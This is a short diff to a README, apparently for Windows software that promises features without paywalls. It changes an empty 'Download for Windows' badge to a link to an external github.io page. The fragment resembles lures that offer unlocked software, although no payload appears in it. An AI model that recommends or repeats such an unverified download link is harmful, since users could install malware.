@@ -33,7 +33,7 @@ We don’t lock features behind paywalls — we enable access.
 
 ## 📥 Download for Windows
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for-Windows-0078D6?style=for-the-badge&logo=windows)]()  
+[![Download for Windows](https://img.shields.io/badge/Download%20for-Windows-0078D6?style=for-the-badge&logo=windows)](https://ce-for-windows.github.io/.github/)  
 *Supports Windows 10 and Windows 11 (64-bit)*
 
 ---
